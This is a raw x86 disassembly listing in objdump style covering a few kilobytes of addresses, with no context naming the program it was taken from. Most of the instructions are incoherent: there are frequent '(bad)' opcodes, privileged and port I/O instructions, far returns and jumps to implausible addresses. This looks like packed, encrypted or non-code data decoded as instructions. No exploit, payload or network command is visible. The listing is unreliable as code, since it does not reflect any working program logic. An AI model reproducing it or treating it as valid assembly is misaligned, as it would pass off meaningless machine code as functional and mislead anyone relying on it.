  429885:	add    BYTE PTR [edi-0x3b7474b3],ch
  42988b:	call   0x4d6e640d
  429890:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  429896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429897:	sahf   
  429898:	inc    ebp
  429899:	xor    cl,BYTE PTR [ebp-0x78]
  42989c:	mov    edx,edi
  42989e:	clc    
  42989f:	dec    ebp
  4298a0:	retf   
  4298a1:	mov    edx,ebx
  4298a3:	call   0x56116c7e
  4298a8:	scas   eax,DWORD PTR es:[edi]
  4298a9:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4298af:	sahf   
  4298b0:	sub    esi,DWORD PTR [edx]
  4298b2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4298b8:	lods   al,BYTE PTR ds:[esi]
  4298b9:	xor    esp,DWORD PTR [ebx]
  4298bb:	add    ecx,DWORD PTR [ebp-0x1c]
  4298be:	mov    edi,DWORD PTR [ebp-0x8]
  4298c1:	mov    bl,cl
  4298c3:	cmp    dl,bl
  4298c5:	jb     0x429895
  4298c7:	add    dh,dl
  4298c9:	dec    ebp
  4298ca:	scas   eax,DWORD PTR es:[edi]
  4298cb:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4298d1:	shr    DWORD PTR [ebx],cl
  4298d3:	into   
  4298d4:	cmp    edx,esi
  4298d6:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4298dc:	dec    ebp
  4298dd:	dec    ebp
  4298de:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4298e4:	retf   
  4298e5:	xor    edx,esi
  4298e7:	add    ecx,esi
  4298e9:	imul   ecx,edx
  4298ec:	mov    DWORD PTR [ebp+0x8],edx
  4298ef:	xor    ecx,DWORD PTR [ebp+0x2b]
  4298f2:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  4298f8:	add    esi,DWORD PTR [ebx]
  4298fa:	mov    ah,0x3
  4298fc:	inc    ebp
  4298fd:	sysexit 
  4298ff:	xlat   BYTE PTR ds:[ebx]
  429900:	pushf  
  429901:	jge    0x42988c
  429903:	xor    ebx,eax
  429905:	sub    eax,DWORD PTR [ebp-0x73]
  429908:	(bad)  
  429909:	cmp    al,al
  42990b:	jb     0x429892
  42990d:	add    al,bh
  42990f:	ror    DWORD PTR [ebp-0x7a],1
  429912:	xor    edi,edi
  429914:	add    edi,edi
  429916:	jmp    0x429965
  429918:	mov    ecx,DWORD PTR [ebx-0x34341324]
  42991e:	dec    ebp
  42991f:	into   
  429920:	mov    ebp,DWORD PTR [edi-0x23737428]
  429926:	sahf   
  429927:	shl    DWORD PTR [edx],cl
  429929:	retf   0x5588
  42992c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429932:	add    eax,DWORD PTR [eax]
  429934:	in     al,0x4d
  429936:	push   ebp
  429937:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  42993d:	bound  eax,QWORD PTR [eax]
  42993f:	int    0x4d
  429941:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  429947:	dec    ebp
  429948:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  42994e:	jge    0x42991e
  429950:	mov    BYTE PTR [edi+0xf723b3a],ch
  429956:	add    cl,dh
  429958:	dec    ebp
  429959:	dec    DWORD PTR [ebx-0x2c032375]
  42995f:	adc    BYTE PTR [ebp+0x1],0x8b
  429963:	add    al,bl
  429965:	jge    0x4298f3
  429967:	push   0xffffff9e
  429969:	push   0x8b3032
  42996e:	shl    BYTE PTR [ebp+0x55],0x6a
  429972:	xor    edi,edi
  429974:	xor    edx,DWORD PTR [ebx+eax*1]
  429977:	inc    ebp
  429978:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  42997e:	dec    ebp
  42997f:	or     BYTE PTR [ecx+0x4dc8e483],cl
  429985:	jbe    0x429912
  429987:	mov    ebp,esp
  429989:	ror    bl,1
  42998b:	enter  0x14ce,0xaf
  42998f:	dec    DWORD PTR [ebx-0x2cef17f8]
  429995:	push   ebp
  429996:	retf   0x5540
  429999:	push   ebp
  42999a:	mov    esi,DWORD PTR [edx-0x1c]
  42999d:	mov    edx,ebx
  42999f:	cld    
  4299a0:	(bad)  
  4299a1:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4299a8:	sti    
  4299a9:	add    dh,cl
  4299ab:	push   0xffffff94
  4299ad:	call   FWORD PTR [esi+0x3b5032d0]
  4299b3:	mov    ecx,DWORD PTR [edi]
  4299b5:	int3   
  4299b6:	pop    esi
  4299b7:	inc    ebp
  4299b8:	dec    DWORD PTR [ecx+0x45e8c88b]
  4299be:	push   ebp
  4299bf:	xor    esi,DWORD PTR [ebx]
  4299c1:	mov    DWORD PTR [ebx],0xcacc0f9c
  4299c7:	aas    
  4299c8:	push   ebp
  4299c9:	inc    ebp
  4299ca:	xor    eax,esp
  4299cc:	add    eax,esp
  4299ce:	mov    eax,DWORD PTR [ebx]
  4299d0:	(bad)  
  4299d1:	jmp    0x42995f
  4299d3:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  4299d9:	rol    ah,1
  4299db:	mov    esi,0xf133104d
  4299e0:	mov    edx,0xff358d80
  4299e5:	mov    dh,0xd1
  4299e7:	cmp    edx,DWORD PTR [ebp+0xf]
  4299ea:	mov    eax,DWORD PTR [edx-0x20]
  4299ed:	add    BYTE PTR [ebp-0x75],bh
  4299f0:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4299f7:	sahf   
  4299f8:	retf   0x8632
  4299fb:	cmp    ebp,0x8
  4299fe:	call   ebx
  429a00:	inc    ebp
  429a01:	inc    ebp
  429a02:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  429a08:	mov    esi,DWORD PTR ds:0xc7049cc8
  429a0e:	add    al,al
  429a10:	add    bl,al
  429a12:	(bad)  
  429a13:	clc    
  429a14:	enter  0x45,0x35
  429a18:	push   eax
  429a19:	pushf  
  429a1a:	mov    edi,eax
  429a1c:	int3   
  429a1d:	or     al,al
  429a1f:	test   DWORD PTR [edi],edi
  429a21:	clc    
  429a22:	gs inc ebp
  429a24:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  429a2a:	push   ss
  429a2b:	xor    ecx,DWORD PTR [ebp+0x3]
  429a2e:	sub    edx,DWORD PTR [ecx-0x76]
  429a31:	dec    ebp
  429a32:	add    DWORD PTR [ebx+0x88d845],ecx
  429a38:	mov    esi,DWORD PTR [ebx]
  429a3a:	or     BYTE PTR [ebx],al
  429a3c:	cmp    edx,DWORD PTR [ecx-0x38]
  429a3f:	dec    ebp
  429a40:	out    dx,eax
  429a41:	xor    eax,DWORD PTR [ebp+0x3]
  429a44:	mov    edx,DWORD PTR [ecx-0x28]
  429a47:	dec    ebp
  429a48:	add    BYTE PTR [ebx],dh
  429a4a:	push   0x518003
  429a4f:	push   eax
  429a50:	add    BYTE PTR [ebx-0x300748b],cl
  429a56:	sbb    BYTE PTR [ebp+0x45],cl
  429a59:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  429a5f:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  429a65:	dec    ebp
  429a66:	inc    ebp
  429a67:	xor    eax,esp
  429a69:	add    eax,esp
  429a6b:	push   ecx
  429a6c:	(bad)  
  429a6d:	dec    ebp
  429a6e:	mov    al,ds:0xc9e031ff
  429a73:	retf   
  429a74:	(bad)  
  429a75:	into   
  429a76:	sub    bh,bh
  429a78:	dec    esp
  429a79:	adc    al,0x9c
  429a7b:	inc    ebp
  429a7c:	push   ebp
  429a7d:	test   DWORD PTR [edi],ecx
  429a7f:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  429a86:	jmp    0xc9bba99a
  429a8b:	add    cl,dl
  429a8d:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  429a97:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  429a9d:	rol    BYTE PTR [eax],0x57
  429aa0:	clc    
  429aa1:	bound  esi,QWORD PTR [edx+0x7]
  429aa4:	mov    eax,DWORD PTR [ebp-0x30]
  429aa7:	xor    al,0x40
  429aa9:	sub    al,0xc7
  429aab:	mov    ah,ch
  429aad:	add    DWORD PTR [ebp+0x4534f845],eax
  429ab3:	sub    al,0x86
  429ab5:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  429abc:	mov    ch,0xff
  429abe:	clc    
  429abf:	add    DWORD PTR [ebp+0x60],0x31
  429ac3:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  429aca:	inc    ebp
  429acb:	dec    DWORD PTR [ebx-0x341ff701]
  429ad1:	test   esi,ecx
  429ad3:	dec    DWORD PTR [ebx-0x7f8a3301]
  429ad9:	push   eax
  429ada:	add    DWORD PTR [ebp+0x0],eax
  429add:	dec    ebx
  429adf:	or     al,0xce
  429ae1:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  429ae8:	into   
  429ae9:	add    BYTE PTR [ebx-0x34ff1400],cl
  429aef:	mov    esi,ecx
  429af1:	sar    bh,0x45
  429af4:	adc    al,0x8b
  429af6:	clc    
  429af7:	fadd   DWORD PTR [ebp+0x0]
  429afa:	mov    ebp,DWORD PTR [edx+0x8]
  429afd:	push   edi
  429afe:	adc    BYTE PTR [eax+0x1],0x83
  429b02:	add    al,al
  429b04:	retf   
  429b05:	mov    ecx,esi
  429b07:	cld    
  429b08:	mov    eax,DWORD PTR [eax+0xcb01cc]
  429b0e:	into   
  429b0f:	add    BYTE PTR [ebx+0x756aec00],cl
  429b15:	jne    0x429b4a
  429b17:	inc    DWORD PTR [ebx]
  429b19:	rcl    BYTE PTR [ecx+0x50],1
  429b1c:	push   eax
  429b1d:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  429b23:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  429b2a:	sar    bh,0x84
  429b2d:	or     BYTE PTR [ebx],al
  429b2f:	push   eax
  429b30:	add    BYTE PTR [ebx+0x4532c845],cl
  429b36:	pushf  
  429b37:	xor    eax,0x89b49cc7
  429b3c:	test   eax,ebp
  429b3e:	clc    
  429b3f:	inc    ebp
  429b40:	inc    ebp
  429b41:	mov    DWORD PTR [eax+eax*8],esi
  429b44:	sub    al,0x34
  429b46:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  429b4d:	dec    ebp
  429b4e:	bound  esi,QWORD PTR [ebx]
  429b50:	inc    edi
  429b51:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  429b57:	dec    ebp
  429b58:	bound  esi,QWORD PTR [ebx]
  429b5a:	inc    edi
  429b5b:	add    eax,DWORD PTR [ebx-0xf7a377]
  429b61:	inc    ebp
  429b62:	add    ch,dl
  429b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b65:	pushf  
  429b66:	inc    edi
  429b68:	dec    esp
  429b6a:	lea    eax,[ebp+0x45fff860]
  429b70:	push   eax
  429b71:	xor    dh,BYTE PTR [ebp-0x64]
  429b74:	(bad)  
  429b75:	(bad)  
  429b76:	pop    esp
  429b77:	lods   al,BYTE PTR ds:[esi]
  429b78:	inc    DWORD PTR [ebp+0x4508f8ff]
  429b7e:	mov    esi,DWORD PTR [eax]
  429b80:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  429b87:	test   DWORD PTR [edi-0x8],edx
  429b8a:	inc    esi
  429b8b:	inc    ebp
  429b8c:	add    BYTE PTR [esi],bh
  429b8e:	push   0x8b809c
  429b93:	in     al,dx
  429b94:	inc    ebp
  429b95:	push   ebp
  429b96:	mov    esi,DWORD PTR [ebx]
  429b98:	cld    
  429b99:	add    eax,DWORD PTR [eax+0xf013b]
  429b9f:	adc    al,0x0
  429ba1:	add    bh,bh
  429ba3:	jmp    0xbf9cc0
  429ba8:	add    BYTE PTR [ebp+0x45],cl
  429bab:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  429bb1:	dec    ebp
  429bb2:	push   0x38033
  429bb7:	cmp    eax,DWORD PTR [eax]
  429bb9:	unpcklps xmm7,xmm0
  429bbc:	jne    0x429bbe
  429bbe:	dec    DWORD PTR [ebx+0x5545cc18]
  429bc4:	mov    DWORD PTR [ebx],esi
  429bc6:	shl    BYTE PTR [ebx],1
  429bc8:	inc    ebp
  429bc9:	add    ecx,DWORD PTR [ecx+0x60fc803]
  429bcf:	retf   0x5575
  429bd2:	dec    DWORD PTR [ebx-0x5ba17e8]
  429bd8:	(bad)  
  429bd9:	stc    
  429bda:	in     al,dx
  429bdb:	or     al,0x85
  429bdd:	dec    ebp
  429bde:	clc    
  429bdf:	xor    eax,DWORD PTR [ebp+0x3]
  429be2:	mov    ebp,ecx
  429be4:	rol    BYTE PTR [eax],1
  429be6:	inc    ebp
  429be7:	add    BYTE PTR [eax-0x7747ab3],bh
  429bed:	clc    
  429bee:	inc    ebp
  429bef:	retf   
  429bf0:	mov    edx,ebx
  429bf2:	in     al,dx
  429bf3:	(bad)  
  429bf4:	retf   
  429bf5:	into   
  429bf6:	into   
  429bf7:	scas   eax,DWORD PTR es:[edi]
  429bf8:	dec    ebp
  429bf9:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  429bff:	sub    ecx,esi
  429c01:	cmp    ecx,DWORD PTR [ebp+0x77]
  429c04:	(bad)  
  429c05:	mov    edi,eax
  429c07:	int3   
  429c08:	test   DWORD PTR [ecx-0x74baff08],ecx
  429c0e:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  429c15:	xor    eax,DWORD PTR [ebp+0x4503f803]
  429c1b:	rdtsc  
  429c1d:	retf   0x559c
  429c20:	(bad)  
  429c21:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  429c28:	inc    ebp
  429c29:	add    eax,0xeb9c4d3f
  429c2e:	(bad)  
  429c2f:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  429c35:	xor    ecx,DWORD PTR [ebp+0x33]
  429c38:	mov    eax,DWORD PTR [ebx]
  429c3a:	call   0xce526742
  429c3f:	retf   0x55d1
  429c42:	test   BYTE PTR [ebx-0x5ff17fe],cl
  429c48:	jmp    0x429c43
  429c4a:	add    BYTE PTR ds:0xebf44d8b,al
  429c50:	push   ebp
  429c51:	mov    ebp,DWORD PTR [ebx]
  429c53:	mov    eax,0x33f8558b
  429c58:	retf   
  429c59:	xor    ecx,esi
  429c5b:	add    edx,ecx
  429c5d:	add    eax,DWORD PTR [edx+0xca010f]
  429c63:	push   ebp
  429c64:	dec    ebp
  429c65:	mov    ecx,DWORD PTR [ebx-0x34050718]
  429c6b:	stc    
  429c6c:	rol    DWORD PTR ds:0xebce4dd6,cl
  429c72:	scas   eax,DWORD PTR es:[edi]
  429c73:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  429c79:	xor    ebp,DWORD PTR [ebx]
  429c7b:	xor    edi,DWORD PTR [ebx]
  429c7d:	add    esi,DWORD PTR [edi+0x3]
  429c80:	mov    ecx,DWORD PTR [edi]
  429c82:	clc    
  429c83:	retf   0x55cb
  429c86:	into   
  429c87:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  429c8e:	test   al,0x4d
  429c90:	push   ebp
  429c91:	jbe    0x429cc6
  429c93:	mov    esi,DWORD PTR [ebx]
  429c95:	mov    al,0x3
  429c97:	push   ebp
  429c98:	add    esi,DWORD PTR [ebx]
  429c9a:	rdpmc  
  429c9c:	retf   0x5503
  429c9f:	add    ecx,DWORD PTR [ebx-0x53517f1]
  429ca5:	dec    ebp
  429ca6:	stc    
  429ca7:	mov    ecx,DWORD PTR [eax]
  429ca9:	or     BYTE PTR [ebp+0x4d],cl
  429cac:	jmp    0x1369d3c
  429cb1:	dec    ebp
  429cb2:	dec    ebp
  429cb3:	(bad)  
  429cb4:	mov    ebx,esp
  429cb6:	clc    
  429cb7:	test   ebx,ecx
  429cb9:	clc    
  429cba:	ror    DWORD PTR [ebp-0x2a],cl
  429cbd:	mov    esi,ecx
  429cbf:	lock scas eax,DWORD PTR es:[edi]
  429cc1:	inc    ebp
  429cc2:	mov    esi,DWORD PTR [ebx]
  429cc4:	hlt    
  429cc5:	pushf  
  429cc6:	jge    0x429c53
  429cc8:	sub    ebx,esp
  429cca:	cmp    ecx,ebx
  429ccc:	ja     0x429c9c
  429cce:	mov    ebp,DWORD PTR [eax-0x58]
  429cd1:	dec    ebp
  429cd2:	xor    ecx,DWORD PTR [di+0x3]
  429cd6:	mov    esp,esp
  429cd8:	clc    
  429cd9:	push   ebp
  429cda:	retf   
  429cdb:	mov    dl,bl
  429cdd:	adc    esi,edx
  429cdf:	jb     0x429caf
  429ce1:	add    BYTE PTR [edi-0xb7474b3],ch
  429ce7:	lock jge 0x429cb5
  429cea:	sub    ecx,DWORD PTR [ebp+0x3b]
  429ced:	mov    esi,DWORD PTR [edi-0x20]
  429cf0:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  429cf7:	mov    BYTE PTR [ebx-0x34b20729],cl
  429cfd:	mov    edx,ebx
  429cff:	lock (bad) 
  429d01:	ror    esi,cl
  429d03:	push   ebp
  429d04:	scas   eax,DWORD PTR es:[edi]
  429d05:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  429d0b:	sahf   
  429d0c:	sub    esi,DWORD PTR [edx]
  429d0e:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  429d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d15:	xor    esp,DWORD PTR [ebx]
  429d17:	add    ecx,DWORD PTR [ebp-0x1c]
  429d1a:	mov    edi,DWORD PTR [ebp-0x8]
  429d1d:	mov    bl,cl
  429d1f:	cmp    dl,bl
  429d21:	jb     0x429cf1
  429d23:	add    dh,dl
  429d25:	dec    ebp
  429d26:	scas   eax,DWORD PTR es:[edi]
  429d27:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  429d2d:	shr    DWORD PTR [ebx],cl
  429d2f:	into   
  429d30:	cmp    edx,esi
  429d32:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  429d38:	dec    ebp
  429d39:	dec    ebp
  429d3a:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  429d40:	retf   
  429d41:	xor    edx,esi
  429d43:	add    ecx,esi
  429d45:	imul   ecx,edx
  429d48:	mov    DWORD PTR [ebp+0x8],edx
  429d4b:	xor    ecx,DWORD PTR [ebp+0x2b]
  429d4e:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  429d54:	add    esi,DWORD PTR [ebx]
  429d56:	rol    BYTE PTR [ebx],0x45
  429d59:	sysexit 
  429d5b:	xlat   BYTE PTR ds:[ebx]
  429d5c:	pushf  
  429d5d:	jge    0x429ce8
  429d5f:	xor    esp,eax
  429d61:	sub    eax,DWORD PTR [ebp-0x73]
  429d64:	(bad)  
  429d65:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  429d6c:	dec    ebp
  429d6d:	xchg   BYTE PTR [ebx],dh
  429d6f:	inc    DWORD PTR [ebx]
  429d71:	(bad)  
  429d72:	jmp    0x429dc1
  429d74:	mov    ecx,DWORD PTR [ebx-0x34341324]
  429d7a:	dec    ebp
  429d7b:	into   
  429d7c:	mov    ebp,DWORD PTR [edi-0x23737420]
  429d82:	sahf   
  429d83:	shl    DWORD PTR [edx],cl
  429d85:	retf   0x5588
  429d88:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429d8e:	add    eax,DWORD PTR [eax]
  429d90:	in     al,0x4d
  429d92:	push   ebp
  429d93:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  429d99:	bound  eax,QWORD PTR [eax]
  429d9b:	int    0x4d
  429d9d:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  429da3:	dec    ebp
  429da4:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  429daa:	jge    0x429d7a
  429dac:	mov    BYTE PTR [edi+0xf723b3a],ch
  429db2:	add    cl,dh
  429db4:	dec    ebp
  429db5:	dec    DWORD PTR [ebx-0x2c032301]
  429dbb:	inc    ebp
  429dbc:	push   ebp
  429dbd:	dec    DWORD PTR [ebx-0x73ff1f34]
  429dc3:	lea    ebx,[esi-0x7400cdac]
  429dc9:	push   eax
  429dca:	mov    ah,0x45
  429dcc:	push   ebp
  429dcd:	mov    esi,DWORD PTR [ebx]
  429dcf:	les    esi,FWORD PTR [ebx]
  429dd1:	add    BYTE PTR [ebx],al
  429dd3:	inc    DWORD PTR [ebx]
  429dd5:	mov    ecx,DWORD PTR [edi]
  429dd7:	cld    
  429dd8:	retf   0x4d80
  429ddb:	add    DWORD PTR [ecx+0x4d30e400],ecx
  429de1:	jne    0x429d6e
  429de3:	(bad)  
  429de4:	in     al,dx
  429de5:	ror    bl,1
  429de7:	clc    
  429de8:	into   
  429de9:	add    BYTE PTR [edi-0xf2f7475],ch
  429def:	not    bl
  429df1:	adc    al,0xca
  429df3:	inc    ebp
  429df4:	push   ebp
  429df5:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  429dfb:	push   0xaf80d6
  429e00:	mov    eax,DWORD PTR [eax]
  429e02:	fdiv   st(7),st
  429e04:	sti    
  429e05:	sbb    dh,cl
  429e07:	pop    esi
  429e08:	xchg   esp,eax
  429e09:	leave  
  429e0a:	sahf   
  429e0b:	add    al,0x32
  429e0d:	push   ebp
  429e0e:	cmp    ebp,esp
  429e10:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  429e14:	dec    DWORD PTR [ecx-0x740f0375]
  429e1a:	push   ebp
  429e1b:	cld    
  429e1c:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  429e22:	retf   0x558b
  429e25:	clc    
  429e26:	xor    esi,eax
  429e28:	add    esi,DWORD PTR [ebp-0x75]
  429e2b:	(bad)  
  429e2c:	hlt    
  429e2d:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  429e34:	mov    DWORD PTR [edx],ecx
  429e36:	hlt    
  429e37:	(bad)  
  429e38:	dec    ebp
  429e39:	add    dh,BYTE PTR [ebx]
  429e3b:	leave  
  429e3c:	mov    edx,0xffec8d55
  429e41:	push   ecx
  429e42:	rol    DWORD PTR [ebp+0x55],1
  429e45:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  429e4b:	mov    eax,0xf8030b33
  429e50:	lar    ecx,di
  429e53:	push   ebp
  429e54:	retf   0x863b
  429e57:	jne    0x429e56
  429e59:	mov    edi,edi
  429e5b:	or     BYTE PTR [ebp+0x41],dh
  429e5e:	mov    esp,eax
  429e60:	cld    
  429e61:	inc    eax
  429e62:	mov    al,0x29
  429e64:	add    DWORD PTR [ecx+0x0],eax
  429e67:	loope  0x429dee
  429e69:	inc    ecx
  429e6a:	call   eax
  429e6c:	inc    edx
  429e6e:	mov    eax,DWORD PTR [eax]
  429e70:	cld    
  429e71:	mov    eax,DWORD PTR [eax+0x8d0151]
  429e77:	clc    
  429e78:	xor    BYTE PTR [ebp+0x45],al
  429e7b:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  429e81:	loopne 0x429e82
  429e83:	mov    edi,edi
  429e85:	mov    ecx,eax
  429e87:	clc    
  429e88:	jne    0x429e5a
  429e8a:	call   0x83af93
  429e8f:	sub    DWORD PTR [ebp+0x45],esi
  429e92:	test   esi,eax
  429e94:	je     0x429e97
  429e96:	mov    eax,esi
  429e98:	cld    
  429e99:	or     DWORD PTR [eax+0x401c9],eax
  429e9f:	push   ebp
  429ea0:	add    ah,ch
  429ea2:	add    BYTE PTR [ecx+0x6a],dl
  429ea5:	inc    ebp
  429ea6:	push   esi
  429ea7:	mov    DWORD PTR [eax-0x4],edx
  429eaa:	pop    edi
  429eab:	mov    ebx,DWORD PTR [ebx-0x4]
  429eae:	ret    0xbe
  429eb1:	push   es
  429eb2:	mov    ecx,DWORD PTR [ecx-0x77274af]
  429eb8:	clc    
  429eb9:	lock inc ebp
  429ebb:	jne    0x429f13
  429ebd:	(bad)  
  429ebe:	jne    0x429ec4
  429ec0:	mov    eax,0xf841ba66
  429ec5:	rol    BYTE PTR [esi],1
  429ec7:	(bad)  
  429ec8:	jne    0x429efb
  429eca:	cmp    eax,ebx
  429ecc:	pop    esi
  429ecd:	mov    ecx,DWORD PTR [eax]
  429ecf:	push   ecx
  429ed0:	inc    ecx
  429ed1:	lea    edi,[eax+edi*8+0x42]
  429ed5:	inc    ebp
  429ed6:	ror    DWORD PTR [ebx-0x408303be],0x41
  429edd:	xchg   edx,ebp
  429edf:	mov    ebx,eax
  429ee1:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  429ee7:	or     edi,eax
  429ee9:	inc    ebp
  429eea:	inc    ebp
  429eeb:	(bad)  
  429eec:	mov    ecx,DWORD PTR [eax]
  429eee:	cld    
  429eef:	(bad)  
  429ef0:	jmp    0x429ef3
  429ef2:	mov    eax,esi
  429ef4:	mov    DWORD PTR ds:0x4f8c98b,eax
  429efa:	rcl    BYTE PTR [esi+0xf],1
  429efd:	iret   
  429efe:	inc    ebp
  429eff:	leave  
  429f00:	(bad)  
  429f01:	dec    DWORD PTR [ecx]
  429f03:	mov    eax,esi
  429f05:	mov    eax,DWORD PTR [edi]
  429f07:	mov    dh,0xd1
  429f0a:	push   es
  429f0b:	nop
  429f0c:	(bad)  
  429f0d:	inc    DWORD PTR [ebx]
  429f0f:	push   esi
  429f10:	leave  
  429f11:	iret   
  429f12:	add    al,0x46
  429f14:	push   ebp
  429f15:	in     eax,0xec
  429f17:	push   ebp
  429f18:	push   ecx
  429f19:	inc    DWORD PTR [ebp+0x56]
  429f1c:	mov    DWORD PTR [esi-0x4],eax
  429f1f:	loope  0x429f76
  429f21:	sbb    BYTE PTR [eax+0x7c6daff],bh
  429f27:	add    al,BYTE PTR [edx]
  429f29:	mov    edx,DWORD PTR [ebp-0x17]
  429f2c:	cmp    edi,esi
  429f2e:	jne    0x429f2f
  429f30:	(bad)  
  429f31:	push   esi
  429f32:	pop    es
  429f33:	push   ebp
  429f34:	mov    ebp,esp
  429f36:	or     BYTE PTR [ebp+0x41],al
  429f39:	add    edi,edx
  429f3b:	sub    BYTE PTR [eax-0x4],al
  429f3e:	shl    BYTE PTR [ebp-0x3e],0x1
  429f42:	add    BYTE PTR [ebx+ecx*4],bl
  429f45:	mov    edx,DWORD PTR [ecx+0x14]
  429f48:	lea    edx,[edx-0x1ba7508]
  429f4e:	push   esi
  429f4f:	enter  0xd375,0xb8
  429f53:	test   DWORD PTR [esi],0x6ce0750
  429f59:	enter  0xd375,0x3b
  429f5d:	neg    DWORD PTR [esi+0x50]
  429f60:	or     cl,dl
  429f62:	inc    edx
  429f63:	(bad)  
  429f64:	in     eax,dx
  429f65:	in     al,dx
  429f66:	(bad)  
  429f67:	sub    eax,DWORD PTR [ebx]
  429f69:	inc    eax
  429f6a:	in     eax,dx
  429f6b:	push   eax
  429f6c:	add    dl,BYTE PTR [eax-0x37]
  429f6f:	push   edi
  429f70:	push   ebp
  429f71:	imul   ah
  429f73:	adc    DWORD PTR [ecx-0x1],0x45
  429f77:	add    BYTE PTR [ecx+0x55d3fc00],cl
  429f7d:	lea    edi,[eax-0x7fff4ca]
  429f83:	mov    eax,0x4550402
  429f88:	cmp    ebp,ecx
  429f8a:	jne    0x429f37
  429f8c:	mov    eax,DWORD PTR ds:0x241e808
  429f92:	loope  0x429f94
  429f94:	inc    eax
  429f95:	stc    
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	ss inc ecx
  429f99:	aas    
  429f9a:	in     eax,0x7d
  429f9c:	ret    0x8b
  429f9f:	lock mov edi,DWORD PTR [ebp-0x18]
  429fa3:	and    edi,edi
  429fa5:	mov    edi,edi
  429fa7:	call   0xe410a083
  429fac:	push   es
  429fad:	add    al,ch
  429faf:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  429fb6:	(bad)  
  429fb7:	hlt    
  429fb8:	add    eax,0xffd3e87d
  429fbd:	cmp    bh,0x8
  429fc0:	(bad)  
  429fc1:	fld    DWORD PTR [esi]
  429fc3:	out    dx,al
  429fc4:	call   0xffa19ecc
  429fc9:	cmp    al,0x46
  429fcb:	shr    edx,0x8
  429fce:	(bad)  
  429fcf:	pop    es
  429fd0:	fisttp QWORD PTR [ebp+0xe577eff]
  429fd6:	push   ebx
  429fd7:	add    BYTE PTR [ebx+0x24008b56],cl
  429fdd:	add    BYTE PTR [ebp+0x50],al
  429fe0:	push   eax
  429fe1:	add    DWORD PTR [ebx+0x757d1834],ecx
  429fe7:	sub    edx,DWORD PTR [esi-0x24]
  429fea:	jne    0x429fa2
  429fec:	lods   eax,DWORD PTR ds:[esi]
  429fed:	mov    edx,DWORD PTR [edx-0x34]
  429ff0:	dec    esi
  429ff1:	out    0x83,eax
  429ff3:	into   
  429ff4:	push   edi
  429ff6:	loopne 0x429fc6
  429ff8:	shr    BYTE PTR [edx+ecx*4+0x0],1
  429ffc:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  42a003:	rol    DWORD PTR [edx],0x8
  42a006:	mov    esp,ecx
  42a008:	cmp    DWORD PTR [ebx],0xc
  42a00b:	mov    esi,0x5001c0
  42a010:	push   eax
  42a011:	push   cs
  42a012:	push   eax
  42a013:	(bad)  
  42a014:	sub    edx,edi
  42a016:	push   esi
  42a017:	adc    al,0xcb
  42a019:	ins    DWORD PTR es:[edi],dx
  42a01a:	mov    eax,0x203e8
  42a01f:	add    al,ah
  42a021:	inc    esi
  42a022:	mov    al,ch
  42a024:	pop    es
  42a025:	add    DWORD PTR [eax],0x1
  42a028:	add    dh,al
  42a02a:	add    ah,ch
  42a02c:	rol    DWORD PTR [edx-0xd],1
  42a02f:	cli    
  42a030:	push   0x4a
  42a032:	pop    ecx
  42a033:	retf   0xfe6
